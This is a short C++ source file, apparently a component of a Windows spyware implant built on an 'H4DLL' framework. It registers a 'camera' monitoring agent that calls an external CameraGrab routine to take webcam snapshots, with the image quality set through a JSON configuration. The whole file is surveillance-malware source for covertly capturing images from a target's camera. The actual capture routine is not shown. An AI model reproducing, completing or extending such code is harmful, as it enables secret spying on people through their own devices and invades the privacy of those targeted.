#define _CRT_SECURE_NO_WARNINGS 1

#include <Windows.h>
#include <json/JSON.h>
#include "../../H4DLL/common.h"
#include "../../H4DLL/H4-DLL.h"
#include "../../H4DLL/bss.h"
#include "../../H4DLL/AM_Core.h"
#include "../../H4DLL/HM_IpcModule.h"
#include "../../H4DLL/HM_InbundleHook.h"

extern void CameraGrab(DWORD quality);

#define CAM_IMG_QUALITY_LOW 10
#define CAM_IMG_QUALITY_MED 50
#define CAM_IMG_QUALITY_HI 100

static DWORD cam_image_quality = CAM_IMG_QUALITY_MED;

DWORD WINAPI PM_WebCamStartStop(BOOL bStartFlag, BOOL bReset)
{
	if (bStartFlag && bReset) 
		CameraGrab(cam_image_quality);

	return 1;
}

DWORD WINAPI PM_WebCamInit(JSONObject elem)
{
	if (!wcscmp(elem[L"quality"]->AsString().c_str(), L"hi") ) {
		cam_image_quality = CAM_IMG_QUALITY_HI; 
	} else if (!wcscmp(elem[L"quality"]->AsString().c_str(), L"med") ) {
		cam_image_quality = CAM_IMG_QUALITY_MED;
	} else { 
		cam_image_quality = CAM_IMG_QUALITY_LOW;
	}

	return 1;
}

void PM_WebCamRegister()
{
	AM_MonitorRegister("camera", PM_WEBCAMAGENT, NULL, (BYTE *)PM_WebCamStartStop, (BYTE *)PM_WebCamInit, NULL);
}